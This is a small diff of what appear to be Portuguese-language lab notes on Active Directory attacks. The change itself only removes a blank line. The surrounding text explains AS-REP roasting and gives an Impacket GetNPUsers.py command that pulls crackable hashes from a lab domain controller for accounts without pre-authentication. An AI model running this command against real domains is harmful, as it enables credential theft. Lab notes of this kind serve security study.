@@ -48,7 +48,6 @@ pipx install impacket
 
 -----
 ** AS-REP roasting
-
 users que possuem a opção 'DoesNotRequirePreAuth' == $true são vulneráveis ao AS-REP roasting, pois é possível capturar seus respectivos HASHES -->
 #+begin_src sh
 GetNPUsers.py dc01.lab/ -dc-ip 192.168.122.26 -format hashcat -usersfile names.txt
